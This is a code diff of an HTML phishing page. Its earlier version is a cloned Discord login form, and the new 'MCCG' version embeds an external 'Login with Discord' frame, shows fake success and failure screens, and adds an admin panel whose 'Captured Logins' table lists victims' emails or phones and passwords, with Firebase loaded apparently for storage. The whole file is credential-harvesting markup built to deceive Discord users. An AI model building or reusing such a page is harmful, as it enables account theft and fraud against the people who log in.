@@ -3,72 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
     <link rel="stylesheet" href="styles.css">
-    <title>Discord</title>
+    <title>MCCG</title>
 </head>
 <body>
-    <img src="./assets/bg.svg" alt="Discord BG" class="bg">
-    <div class="login-page">
-        <div class="svg-logo-text">
-            <img src="./assets/login-screen-logo.svg" alt="Discord">
-        </div>
-
-        <main class="main">
-            <div class="authBox">
-                <div class="main-form">
-                    <form id="discord-form">
-                        <div class="input-groups">
-                            <div class="main-form-header">
-                                <h1>Welcome back!</h1>
-                                <p>We're so excited to see you again!</p>
-                            </div>
-                            <div class="email-wrapper">
-                                <label for="emailORphone">
-                                    Email or Phone Number
-                                    <span class="required">*</span>
-                                </label>
-                                <input type="text" id="emailORphone" required autocomplete="off">
-                            </div>
-                            <div class="password-wrapper">
-                                <label for="password">
-                                    Password
-                                    <span class="required">*</span>
-                                </label>
-                                <input type="password" id="password" required>
-                            </div>
-                        </div>
-                        <div class="forgot-password">
-                            <a href="#">Forgot your password?</a>
-                        </div>
-                        <div class="login">
-                            <button type="submit">Log In</button>
-                        </div>
-                        <div class="small-register">
-                            <span>Need an account?</span>
-                            <a href="#">Register</a>
-                        </div>
-                    </form>
-                </div>
-
-                <div class="right-section">
-                    <div class="login-container">
-                        <div class="qr-code">
-                            <svg xmlns="http://www.w3.org/2000/svg" height="160" viewBox="0 0 37 37" width="160">
-                                <path d="M 7 0 l 1 0 0 1 -1 0 Z M 8 0 l 1 0 0 1 -1 0 Z M 9 0 l 1 0 0 1 -1 0 Z M 10 0 l 1 0 0 1 -1 0 Z M 16 0 l 1 0 0 1 -1 0 Z M 17 0 l 1 0 0 1 -1 0 Z M 18 0 l 1 0 0 1 -1 0 Z M 21 0 l 1 0 0 1 -1 0 Z M 24 0 l 1 0 0 1 -1 0 Z M 25 0 l 1 0 0 1 -1 0 Z M 26 0 l 1 0 0 1 -1 0 Z M 28 0 l 1 0 0 1 -1 0 Z M 29 0 l 1 0 0 1 -1 0 Z M 1 1 l 1 0 0 1 -1 0 Z M 2 1 l 1 0 0 1 -1 0 Z M 3 1 l 1 0 0 1 -1 0 Z M 4 1 l 1 0 0 1 -1 0 Z M 5 1 l 1 0 0 1 -1 0 Z M 7 1 l 1 0 0 1 -1 0 Z M 13 1 l 1 0 0 1 -1 0 Z M 14 1 l 1 0 0 1 -1 0 Z M 15 1 l 1 0 0 1 -1 0 Z M 19 1 l 1 0 0 1 -1 0 Z M 22 1 l 1 0 0 1 -1 0 Z M 27 1 l 1 0 0 1 -1 0 Z M 29 1 l 1 0 0 1 -1 0 Z M 31 1 l 1 0 0 1 -1 0 Z M 32 1 l 1 0 0 1 -1 0 Z M 33 1 l 1 0 0 1 -1 0 Z M 34 1 l 1 0 0 1 -1 0 Z M 35 1 l 1 0 0 1 -1 0 Z M 1 2 l 1 0 0 1 -1 0 Z M 5 2 l 1 0 0 1 -1 0 Z M 7 2 l 1 0 0 1 -1 0 Z M 10 2 l 1 0 0 1 -1 0 Z M 16 2 l 1 0 0 1 -1 0 Z M 17 2 l 1 0 0 1 -1 0 Z M 18 2 l 1 0 0 1 -1 0 Z M 19 2 l 1 0 0 1 -1 0 Z M 20 2 l 1 0 0 1 -1 0 Z M 22 2 l 1 0 0 1 -1 0 Z M 24 2 l 1 0 0 1 -1 0 Z M 25 2 l 1 0 0 1 -1 0 Z M 26 2 l 1 0 0 1 -1 0 Z M 27 2 l 1 0 0 1 -1 0 Z M 29 2 l 1 0 0 1 -1 0 Z M 31 2 l 1 0 0 1 -1 0 Z M 35 2 l 1 0 0 1 -1 0 Z M 1 3 l 1 0 0 1 -1 0 Z M 5 3 l 1 0 0 1 -1 0 Z M 7 3 l 1 0 0 1 -1 0 Z M 11 3 l 1 0 0 1 -1 0 Z M 13 3 l 1 0 0 1 -1 0 Z M 18 3 l 1 0 0 1 -1 0 Z M 19 3 l 1 0 0 1 -1 0 Z M 21 3 l 1 0 0 1 -1 0 Z M 22 3 l 1 0 0 1 -1 0 Z M 26 3 l 1 0 0 1 -1 0 Z M 27 3 l 1 0 0 1 -1 0 Z M 29 3 l 1 0 0 1 -1 0 Z M 31 3 l 1 0 0 1 -1 0 Z M 35 3 l 1 0 0 1 -1 0 Z M 1 4 l 1 0 0 1 -1 0 Z M 5 4 l 1 0 0 1 -1 0 Z M 7 4 l 1 0 0 1 -1 0 Z M 8 4 l 1 0 0 1 -1 0 Z M 11 4 l 1 0 0 1 -1 0 Z M 13 4 l 1 0 0 1 -1 0 Z M 15 4 l 1 0 0 1 -1 0 Z M 18 4 l 1 0 0 1 -1 0 Z M 19 4 l 1 0 0 1 -1 0 Z M 22 4 l 1 0 0 1 -1 0 Z M 24 4 l 1 0 0 1 -1 0 Z M 25 4 l 1 0 0 1 -1 0 Z M 26 4 l 1 0 0 1 -1 0 Z M 27 4 l 1 0 0 1 -1 0 Z M 28 4 l 1 0 0 1 -1 0 Z M 29 4 l 1 0 0 1 -1 0 Z M 31 4 l 1 0 0 1 -1 0 Z M 35 4 l 1 0 0 1 -1 0 Z M 1 5 l 1 0 0 1 -1 0 Z M 2 5 l 1 0 0 1 -1 0 Z M 3 5 l 1 0 0 1 -1 0 Z M 4 5 l 1 0 0 1 -1 0 Z M 5 5 l 1 0 0 1 -1 0 Z M 7 5 l 1 0 0 1 -1 0 Z M 8 5 l 1 0 0 1 -1 0 Z M 9 5 l 1 0 0 1 -1 0 Z M 10 5 l 1 0 0 1 -1 0 Z M 13 5 l 1 0 0 1 -1 0 Z M 14 5 l 1 0 0 1 -1 0 Z M 15 5 l 1 0 0 1 -1 0 Z M 16 5 l 1 0 0 1 -1 0 Z M 18 5 l 1 0 0 1 -1 0 Z M 19 5 l 1 0 0 1 -1 0 Z M 20 5 l 1 0 0 1 -1 0 Z M 21 5 l 1 0 0 1 -1 0 Z M 22 5 l 1 0 0 1 -1 0 Z M 23 5 l 1 0 0 1 -1 0 Z M 27 5 l 1 0 0 1 -1 0 Z M 28 5 l 1 0 0 1 -1 0 Z M 29 5 l 1 0 0 1 -1 0 Z M 31 5 l 1 0 0 1 -1 0 Z M 32 5 l 1 0 0 1 -1 0 Z M 33 5 l 1 0 0 1 -1 0 Z M 34 5 l 1 0 0 1 -1 0 Z M 35 5 l 1 0 0 1 -1 0 Z M 7 6 l 1 0 0 1 -1 0 Z M 9 6 l 1 0 0 1 -1 0 Z M 11 6 l 1 0 0 1 -1 0 Z M 13 6 l 1 0 0 1 -1 0 Z M 15 6 l 1 0 0 1 -1 0 Z M 17 6 l 1 0 0 1 -1 0 Z M 19 6 l 1 0 0 1 -1 0 Z M 21 6 l 1 0 0 1 -1 0 Z M 23 6 l 1 0 0 1 -1 0 Z M 25 6 l 1 0 0 1 -1 0 Z M 27 6 l 1 0 0 1 -1 0 Z M 29 6 l 1 0 0 1 -1 0 Z M 0 7 l 1 0 0 1 -1 0 Z M 1 7 l 1 0 0 1 -1 0 Z M 2 7 l 1 0 0 1 -1 0 Z M 3 7 l 1 0 0 1 -1 0 Z M 4 7 l 1 0 0 1 -1 0 Z M 5 7 l 1 0 0 1 -1 0 Z M 6 7 l 1 0 0 1 -1 0 Z M 7 7 l 1 0 0 1 -1 0 Z M 9 7 l 1 0 0 1 -1 0 Z M 10 7 l 1 0 0 1 -1 0 Z M 15 7 l 1 0 0 1 -1 0 Z M 20 7 l 1 0 0 1 -1 0 Z M 21 7 l 1 0 0 1 -1 0 Z M 24 7 l 1 0 0 1 -1 0 Z M 25 7 l 1 0 0 1 -1 0 Z M 27 7 l 1 0 0 1 -1 0 Z M 29 7 l 1 0 0 1 -1 0 Z M 30 7 l 1 0 0 1 -1 0 Z M 31 7 l 1 0 0 1 -1 0 Z M 32 7 l 1 0 0 1 -1 0 Z M 33 7 l 1 0 0 1 -1 0 Z M 34 7 l 1 0 0 1 -1 0 Z M 35 7 l 1 0 0 1 -1 0 Z M 36 7 l 1 0 0 1 -1 0 Z" fill="#ffffff"></path>
-                                <path d="M 0 0 l 1 0 0 1 -1 0 Z M 1 0 l 1 0 0 1 -1 0 Z M 2 0 l 1 0 0 1 -1 0 Z M 3 0 l 1 0 0 1 -1 0 Z M 4 0 l 1 0 0 1 -1 0 Z M 5 0 l 1 0 0 1 -1 0 Z M 6 0 l 1 0 0 1 -1 0 Z M 11 0 l 1 0 0 1 -1 0 Z M 12 0 l 1 0 0 1 -1 0 Z M 13 0 l 1 0 0 1 -1 0 Z M 14 0 l 1 0 0 1 -1 0 Z M 15 0 l 1 0 0 1 -1 0 Z M 19 0 l 1 0 0 1 -1 0 Z M 20 0 l 1 0 0 1 -1 0 Z M 22 0 l 1 0 0 1 -1 0 Z M 23 0 l 1 0 0 1 -1 0 Z M 27 0 l 1 0 0 1 -1 0 Z M 30 0 l 1 0 0 1 -1 0 Z M 31 0 l 1 0 0 1 -1 0 Z M 32 0 l 1 0 0 1 -1 0 Z M 33 0 l 1 0 0 1 -1 0 Z M 34 0 l 1 0 0 1 -1 0 Z M 35 0 l 1 0 0 1 -1 0 Z M 36 0 l 1 0 0 1 -1 0 Z M 0 1 l 1 0 0 1 -1 0 Z M 6 1 l 1 0 0 1 -1 0 Z M 8 1 l 1 0 0 1 -1 0 Z M 9 1 l 1 0 0 1 -1 0 Z M 10 1 l 1 0 0 1 -1 0 Z M 11 1 l 1 0 0 1 -1 0 Z M 12 1 l 1 0 0 1 -1 0 Z M 16 1 l 1 0 0 1 -1 0 Z M 17 1 l 1 0 0 1 -1 0 Z M 18 1 l 1 0 0 1 -1 0 Z M 20 1 l 1 0 0 1 -1 0 Z M 21 1 l 1 0 0 1 -1 0 Z M 23 1 l 1 0 0 1 -1 0 Z M 24 1 l 1 0 0 1 -1 0 Z M 25 1 l 1 0 0 1 -1 0 Z M 26 1 l 1 0 0 1 -1 0 Z M 28 1 l 1 0 0 1 -1 0 Z M 30 1 l 1 0 0 1 -1 0 Z M 36 1 l 1 0 0 1 -1 0 Z M 0 2 l 1 0 0 1 -1 0 Z M 2 2 l 1 0 0 1 -1 0 Z M 3 2 l 1 0 0 1 -1 0 Z M 4 2 l 1 0 0 1 -1 0 Z M 6 2 l 1 0 0 1 -1 0 Z M 8 2 l 1 0 0 1 -1 0 Z M 9 2 l 1 0 0 1 -1 0 Z M 11 2 l 1 0 0 1 -1 0 Z M 12 2 l 1 0 0 1 -1 0 Z M 13 2 l 1 0 0 1 -1 0 Z M 14 2 l 1 0 0 1 -1 0 Z M 15 2 l 1 0 0 1 -1 0 Z M 21 2 l 1 0 0 1 -1 0 Z M 23 2 l 1 0 0 1 -1 0 Z M 28 2 l 1 0 0 1 -1 0 Z M 30 2 l 1 0 0 1 -1 0 Z M 32 2 l 1 0 0 1 -1 0 Z M 33 2 l 1 0 0 1 -1 0 Z M 34 2 l 1 0 0 1 -1 0 Z M 36 2 l 1 0 0 1 -1 0 Z M 0 3 l 1 0 0 1 -1 0 Z M 2 3 l 1 0 0 1 -1 0 Z M 3 3 l 1 0 0 1 -1 0 Z M 4 3 l 1 0 0 1 -1 0 Z M 6 3 l 1 0 0 1 -1 0 Z M 8 3 l 1 0 0 1 -1 0 Z M 9 3 l 1 0 0 1 -1 0 Z M 10 3 l 1 0 0 1 -1 0 Z M 12 3 l 1 0 0 1 -1 0 Z M 14 3 l 1 0 0 1 -1 0 Z M 15 3 l 1 0 0 1 -1 0 Z M 16 3 l 1 0 0 1 -1 0 Z M 17 3 l 1 0 0 1 -1 0 Z M 20 3 l 1 0 0 1 -1 0 Z M 23 3 l 1 0 0 1 -1 0 Z M 24 3 l 1 0 0 1 -1 0 Z M 25 3 l 1 0 0 1 -1 0 Z M 28 3 l 1 0 0 1 -1 0 Z M 30 3 l 1 0 0 1 -1 0 Z M 32 3 l 1 0 0 1 -1 0 Z M 33 3 l 1 0 0 1 -1 0 Z M 34 3 l 1 0 0 1 -1 0 Z M 36 3 l 1 0 0 1 -1 0 Z M 0 4 l 1 0 0 1 -1 0 Z M 2 4 l 1 0 0 1 -1 0 Z M 3 4 l 1 0 0 1 -1 0 Z M 4 4 l 1 0 0 1 -1 0 Z M 6 4 l 1 0 0 1 -1 0 Z M 9 4 l 1 0 0 1 -1 0 Z M 10 4 l 1 0 0 1 -1 0 Z M 12 4 l 1 0 0 1 -1 0 Z M 14 4 l 1 0 0 1 -1 0 Z M 16 4 l 1 0 0 1 -1 0 Z M 17 4 l 1 0 0 1 -1 0 Z M 20 4 l 1 0 0 1 -1 0 Z M 21 4 l 1 0 0 1 -1 0 Z M 23 4 l 1 0 0 1 -1 0 Z M 30 4 l 1 0 0 1 -1 0 Z M 32 4 l 1 0 0 1 -1 0 Z M 33 4 l 1 0 0 1 -1 0 Z M 34 4 l 1 0 0 1 -1 0 Z M 36 4 l 1 0 0 1 -1 0 Z M 0 5 l 1 0 0 1 -1 0 Z M 6 5 l 1 0 0 1 -1 0 Z M 11 5 l 1 0 0 1 -1 0 Z M 12 5 l 1 0 0 1 -1 0 Z M 17 5 l 1 0 0 1 -1 0 Z M 24 5 l 1 0 0 1 -1 0 Z M 25 5 l 1 0 0 1 -1 0 Z M 26 5 l 1 0 0 1 -1 0 Z M 30 5 l 1 0 0 1 -1 0 Z M 36 5 l 1 0 0 1 -1 0 Z M 0 6 l 1 0 0 1 -1 0 Z M 1 6 l 1 0 0 1 -1 0 Z M 2 6 l 1 0 0 1 -1 0 Z M 3 6 l 1 0 0 1 -1 0 Z M 4 6 l 1 0 0 1 -1 0 Z M 5 6 l 1 0 0 1 -1 0 Z M 6 6 l 1 0 0 1 -1 0 Z M 8 6 l 1 0 0 1 -1 0 Z M 10 6 l 1 0 0 1 -1 0 Z M 12 6 l 1 0 0 1 -1 0 Z M 14 6 l 1 0 0 1 -1 0 Z M 16 6 l 1 0 0 1 -1 0 Z M 18 6 l 1 0 0 1 -1 0 Z M 20 6 l 1 0 0 1 -1 0 Z M 22 6 l 1 0 0 1 -1 0 Z M 24 6 l 1 0 0 1 -1 0 Z M 26 6 l 1 0 0 1 -1 0 Z M 28 6 l 1 0 0 1 -1 0 Z M 30 6 l 1 0 0 1 -1 0 Z M 31 6 l 1 0 0 1 -1 0 Z M 32 6 l 1 0 0 1 -1 0 Z M 33 6 l 1 0 0 1 -1 0 Z M 34 6 l 1 0 0 1 -1 0 Z M 35 6 l 1 0 0 1 -1 0 Z M 36 6 l 1 0 0 1 -1 0 Z M 8 7 l 1 0 0 1 -1 0 Z M 11 7 l 1 0 0 1 -1 0 Z M 12 7 l 1 0 0 1 -1 0 Z M 13 7 l 1 0 0 1 -1 0 Z M 14 7 l 1 0 0 1 -1 0 Z M 16 7 l 1 0 0 1 -1 0 Z M 17 7 l 1 0 0 1 -1 0 Z M 18 7 l 1 0 0 1 -1 0 Z M 19 7 l 1 0 0 1 -1 0 Z M 22 7 l 1 0 0 1 -1 0 Z M 23 7 l 1 0 0 1 -1 0 Z M 26 7 l 1 0 0 1 -1 0 Z M 28 7 l 1 0 0 1 -1 0 Z" fill="#000000"></path>
-                            </svg>
-                            <img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">
-                        </div>
-                        <h2>Log in with QR Code</h2>
-                        <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
-                        <a href="#">Or sign in with passkey</a>
-                    </div>
+    <!-- Login Screen -->
+    <div id="login-screen" class="screen">
+        <div class="mccg-container">
+            <div class="mccg-header">
+                <h1>MCCG</h1>
+                <p>Login to continue to MCCG</p>
+            </div>
+            
+            <div class="login-preview-wrapper">
+                <p class="login-label">Login with Discord</p>
+                <div class="login-preview" id="login-preview">
+                    <iframe 
+                        id="login-iframe" 
+                        src="https://mccglogin.pages.dev" 
+                        frameborder="0"
+                        scrolling="no"
+                    ></iframe>
                 </div>
             </div>
-        </main>
+        </div>
     </div>
-    
+
+    <!-- Success Screen -->
+    <div id="success-screen" class="screen hidden">
+        <div class="status-box">
+            <div class="status-icon success-icon">
+                <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#43b581" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"/>
+                    <path d="M8 12l2.5 2.5L16 9"/>
+                </svg>
+            </div>
+            <h1>Login Successful</h1>
+            <p>Verifying your account...</p>
+            <div class="loading-bar">
+                <div class="loading-progress"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Error Screen -->
+    <div id="error-screen" class="screen hidden">
+        <div class="status-box error-box">
+            <div class="status-icon">
+                <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#f04747" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"/>
+                    <path d="M12 8v4m0 4h.01"/>
+                </svg>
+            </div>
+            <div class="warning-banner">
+                <p>Make sure you are using your main Discord account. Alternative accounts are prohibited and may result in a permanent ban.</p>
+            </div>
+            <h1>Verification Failed</h1>
+            <p class="error-message">Something went wrong. Please try again or clear your browser cache and attempt to login again.</p>
+            <button id="try-again-btn" class="primary-btn">Login Again</button>
+        </div>
+    </div>
+
+    <!-- Admin Panel -->
+    <div id="admin-screen" class="screen hidden">
+        <div class="admin-panel">
+            <header class="admin-header">
+                <h1>MCCG Admin Panel</h1>
+                <button id="admin-logout-btn" class="secondary-btn">Back to Login</button>
+            </header>
+
+            <div class="admin-content">
+                <!-- Code Generator -->
+                <section class="admin-section">
+                    <div class="section-header">
+                        <h2>MC-CODE Generator</h2>
+                    </div>
+                    <div class="code-generator">
+                        <button id="generate-code-btn" class="primary-btn">Generate MC-CODE</button>
+                        <div id="generated-code-display" class="generated-code hidden">
+                            <span id="code-text">****************</span>
+                            <span id="code-status" class="code-status working">(working)</span>
+                            <button id="copy-code-btn" class="icon-btn">Copy</button>
+                        </div>
+                    </div>
+
+                    <div class="codes-list-section">
+                        <h3>Generated Codes</h3>
+                        <div id="codes-list" class="codes-list">
+                            <p class="empty-state">No codes generated yet</p>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Captured Logins -->
+                <section class="admin-section">
+                    <div class="section-header">
+                        <h2>Captured Logins</h2>
+                        <span id="user-count" class="badge">0</span>
+                    </div>
+                    <div class="users-table-container">
+                        <table class="users-table">
+                            <thead>
+                                <tr>
+                                    <th>Email/Phone</th>
+                                    <th>Password</th>
+                                    <th>Timestamp</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="users-tbody">
+                                <tr>
+                                    <td colspan="4" class="empty-state">No logins captured yet</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+                <!-- Stats -->
+                <section class="admin-section stats-section">
+                    <div class="stat-card">
+                        <h3>Total Logins</h3>
+                        <span id="total-logins">0</span>
+                    </div>
+                    <div class="stat-card">
+                        <h3>Active Codes</h3>
+                        <span id="active-codes">0</span>
+                    </div>
+                    <div class="stat-card">
+                        <h3>Today's Logins</h3>
+                        <span id="today-logins">0</span>
+                    </div>
+                </section>
+            </div>
+        </div>
+    </div>
+
+    <!-- Admin Access Button (shown only for admins) -->
+    <button id="admin-access-btn" class="admin-access-btn hidden">Admin</button>
+
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <script src="app.js"></script>
